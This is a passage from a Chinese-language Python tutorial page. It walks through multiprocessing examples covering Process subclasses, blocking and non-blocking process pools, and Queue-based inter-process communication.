data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task1</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">global</span> m</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        m <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        list1<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'task1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务1.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task2</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">global</span> m</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        m <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        list1<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'task2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务2.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token comment\"># 子进程</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    p <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务1'</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    p<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    p1 <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task2<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务2'</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        m <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------->main:'</span><span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"4-process04\"><a class=\"anchor\" href=\"#4-process04\">#</a> 4. process04</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进程：自定义</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Process</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyProcess</span><span class=\"token punctuation\">(</span>Process<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span>MyProcess<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        self<span class=\"token punctuation\">.</span>num <span class=\"token operator\">=</span> num</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\"># 重写 run 方法</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        n <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token comment\"># print (' 进程名字：' + self.name)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125;--------->自定义进程,n:&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            n <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p <span class=\"token operator\">=</span> MyProcess<span class=\"token punctuation\">(</span><span class=\"token string\">'小明'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p1 <span class=\"token operator\">=</span> MyProcess<span class=\"token punctuation\">(</span><span class=\"token string\">'小红'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"5-processpool05\"><a class=\"anchor\" href=\"#5-processpool05\">#</a> 5. processpool05</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>当需要创建的子进程数量不多时，可以直接利用multiprocessing中的Process动态成生多个进程，</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>但如果是上百甚至上千个目标，手动的去创建进程的工作量巨大，此时就可以用到multiprocessing模块提供的Pool方法。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>初始化Pool时，可以指定一个最大进程数，当有新的请求提交到Pool中时，如果池还没有满，</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到指定的最大值，那么该请求就会等待，</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>直到池中有进程结束，才会创建新的进程来执行。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>非阻塞式:全部添加到队列中，立刻返回，并没有等待其他的进程完毕，但是回调函数是等待任务完成之后才调用。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>阻塞式:</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Pool</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 非阻塞式进程</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task</span><span class=\"token punctuation\">(</span>task_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'开始做任务啦!'</span><span class=\"token punctuation\">,</span> task_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\"># 使用 sleep</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    end <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\"># print()</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'完成任务:&#123;&#125;!用时:&#123;&#125;,进程id:&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>task_name<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>end <span class=\"token operator\">-</span> start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>container <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">callback_func</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    container<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    pool <span class=\"token operator\">=</span> Pool<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    tasks <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'听音乐'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'吃饭'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'洗衣服'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'打游戏'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'散步'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'看孩子'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'做饭'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">for</span> task1 <span class=\"token keyword\">in</span> tasks<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        pool<span class=\"token punctuation\">.</span>apply_async<span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>task1<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> callback<span class=\"token operator\">=</span>callback_func<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    pool<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 添加任务结束</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    pool<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> container<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'over!!!!!'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"6-processpool06\"><a class=\"anchor\" href=\"#6-processpool06\">#</a> 6. processpool06</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 阻塞式</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Pool</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> 特点：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> 添加一个执行一个任务，如果一个任务不结束另一个任务就进不来。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre> 进程池：</pre></td></tr><tr><td data-num=\"11\"></td><td><pre> pool = Pool(max)  创建进程池对象</pre></td></tr><tr><td data-num=\"12\"></td><td><pre> pool.apply()  阻塞的</pre></td></tr><tr><td data-num=\"13\"></td><td><pre> pool.apply_async()  非阻塞的</pre></td></tr><tr><td data-num=\"14\"></td><td><pre> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre> pool.close()  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre> pool.join()  让主进程让步</pre></td></tr><tr><td data-num=\"17\"></td><td><pre> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task</span><span class=\"token punctuation\">(</span>task_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'开始做任务啦!'</span><span class=\"token punctuation\">,</span> task_name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    start <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\"># 使用 sleep</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    end <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'完成任务:&#123;&#125;!用时:&#123;&#125;,进程id:&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>task_name<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>end <span class=\"token operator\">-</span> start<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    pool <span class=\"token operator\">=</span> Pool<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    tasks <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'听音乐'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'吃饭'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'洗衣服'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'打游戏'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'散步'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'看孩子'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'做饭'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">for</span> task1 <span class=\"token keyword\">in</span> tasks<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        pool<span class=\"token punctuation\">.</span><span class=\"token builtin\">apply</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>task1<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    pool<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    pool<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'over!!!!'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"7-queue07\"><a class=\"anchor\" href=\"#7-queue07\">#</a> 7. queue07</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进程间通信</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Queue</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span> Queue<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'B'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'C'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'D'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>qsize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> q<span class=\"token punctuation\">.</span>full<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 判断队列是否满    q.empty ()  判断队列是否是空的</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token string\">'F'</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># put () 如果 queue 满了则只能等待，除非有‘空地’则添加成功</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'队列已满！'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 获取队列的值</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># q.put_nowait()</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># q.get_nowait()</span></pre></td></tr></table></figure><h3 id=\"8-process08\"><a class=\"anchor\" href=\"#8-process08\">#</a> 8. process08</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进程间通信</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Process<span class=\"token punctuation\">,</span> Queue</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">download</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    images <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'girl.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'boy.jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token 